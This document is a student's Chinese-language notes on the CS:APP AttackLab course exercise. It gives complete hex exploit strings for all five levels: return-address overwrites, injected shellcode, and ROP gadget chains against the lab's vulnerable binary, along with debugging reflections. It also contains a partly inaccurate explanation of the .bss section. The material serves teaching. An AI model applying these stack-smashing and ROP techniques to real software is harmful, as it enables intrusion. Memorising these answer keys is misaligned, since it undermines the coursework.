## AttackLab

* 复习
  * 管道的使用方法
  * 向函数传入参数不是用< ,这个是重定向. 当然如果参数是文件可以这样用

### Level1

非常简单,直接修改函数的返回地址就可以了



### Level 2

* getbuf函数将ret返回到栈区,栈区存储自己的攻击代码
* 将rdi的值设置为cookie
* 因为sub中的立即数未加$导致出错.....
* 两条指令之间不用的内存要用90(nop)填充,不然会内存报错
* x00007ffff7c75150 in __vfprintf_internal (s=0x7ffff7e1a780 <_IO_2_1_stdout_>, format=0x4030e8 "Touch2!: You called touch2(0x%.8x)\n", ap=ap@entry=0x5561dba8, mode_flags=mode_flags@entry=2) at ./这段输出要找为什么(卡住了,为什么会在这里segementaion fault呢?) (仍然不懂为什么)
* 陷入了一个错误的思维误区!!把栈当成"字节数组",想往地址里面填充东西,实际上应该是把他当成一个栈,栈指针以上的东西都是不能再被访问的!不能通过随意减去栈指针来访问内容!
* 所以实际上最后只需要三个指令
* mov 
* push
* ret

/* Level 1 */ 
/* 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00*/
/* Level 2 */
48 c7 c7 fa 97 b9 59 90   /* movq   $0x59b997fa , %rdi  nop*/
48 2b 24 25 20 00 00 c3 /* add 0x20,%rsp */
ec 17 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 d6 61 55 00 00 00 00 /* 这段应该是栈指针的代码 ，先找出栈指针的位置*/



### Level3

* getbuf函数将内容写在数据区中,而不是写在缓冲区中!!!所以说,缓冲区在栈里面,缓冲区只有暂时中转数据的功能,add rsp指令会把栈顶指针返回到原来的位置.栈顶指针上面的位置可以写入攻击代码

* hexmatch中rdi(我们字符串的地址)没有传递错误,但是在strncmp函数中,rdi中的地址指向的值变化了,因为hexmatch破坏了栈中存储的值
  * 破案了,被hexmatch中的push给重写了我地址里面的内容
  * 同时,mov 0x78(%rsp)是改变0x5561dc78
  * push之前,rsp指向的是0x51661dc98,三个push之后还是会修改原来缓冲区的东西
    * 所以,我想直接把指针指向内存中存储的位置
  
* todo:查看指针放在数据区的哪个位置,然后将rdi存储为这个值

* 0000000000605104 <gets_cnt>:
    605104:	00 00                	add    %al,(%rax) 为什么0000代表的是add ,而且很奇怪的是,我之前array标签不是代表是数组吗,为什么反汇编后还是命令

* .bss 

  * 在汇编语言和编译器中，`.bss` 是一种特殊的段（segment）或区域（section），用于存放未初始化的 *全局变量、静态变量和局部静态变量*等数据。`.bss` 是 "Block Started by Symbol" 的缩写，表示由符号开始的块，它通常位于程序的数据段（`.data`）和堆（heap）之间。

    `.bss` 段中的变量在程序加载时并不会占用实际的空间，而是在程序开始执行时根据需要进行分配。这是因为，未初始化的变量在内存中都被初始化为 0 或者空指针，因此在编译时无需为它们分配实际的空间。当程序需要使用这些变量时，会根据变量的定义动态分配内存，并将其地址存储在变量的符号表中。因此，`.bss` 段中的变量通常具有较大的大小，但实际占用的内存空间很少。

    在汇编语言中，可以使用 `.bss` 标签来声明一个未初始化的变量。例如，下面的代码声明了一个名为 `buf` 的 4096 字节的缓冲区：

    ```
    section .bss
    buf resb 4096
    ```

    这个声明告诉编译器为 `buf` 分配 4096 字节的空间，但不会对其进行初始化。在程序运行时，可以通过 `buf` 符号来访问这个缓冲区。

* getchar函数返回0xFFFFFFFFF(-1),则代表文件读取结束或者发生了读取错误

* 这个Gets函数和gets函数不一样!我们无法看到Gets函数内部的具体实现,但是我们可以知道,Gets函数里面应该是会有一个全局变量的,他会存储缓冲区里面的内容

  * Gets函数里面的save_char函数没看懂

* 我对答案不是很理解,如果是放在test的栈空间里,不是会破坏掉test里面的内容吗?

  * !!我们是黑客呀!test里面的内容已经不影响了,因为我们不会再回到test里面了,我们直接exit出去!!

* 其实只要想明白,attacklab还是很容易的.......

答案代码:

	00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 a8 dc 61 55 90 
68 fa 18 40 00 c3 90 90
00 00 00 00 00 00 00 00
88 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61

### Level 4

* 找了一遍,发现没有对应的字节码,只好用别的方法了.提示了可以用pop指令,那可以往栈中注入cookie,利用pop %rdi指令将rdi设置为cookie(没有pop %rdi,那就利用rax进行中转)
* 两条指令就行了! pop %rax movq %rax,%rdi
  * 答案:
  * 00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    cc 19 40 00 00 00 00 00 
    fa 97 b9 59 00 00 00 00
    c5 19 40 00 00 00 00 00
    ec 17 40 00 00 00 00 00



### Level 5

* 也不难,关键是要知道add_xy这个函数的存在,不然真的算不了.....
* String存储的位置不要用负数的偏移量,因为两个负数相加会溢出(都是负数加负数),用正数的偏移量
* 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  06 1a 40 00 00 00 00 00
  c5 19 40 00 00 00 00 00
  cc 19 40 00 00 00 00 00
  48 00 00 00 00 00 00 00
  42 1a 40 00 00 00 00 00
  34 1a 40 00 00 00 00 00
  27 1a 40 00 00 00 00 00
  d6 19 40 00 00 00 00 00
  c5 19 40 00 00 00 00 00
  fa 18 40 00 00 00 00 00
  35 39 62 39 39 37 66 61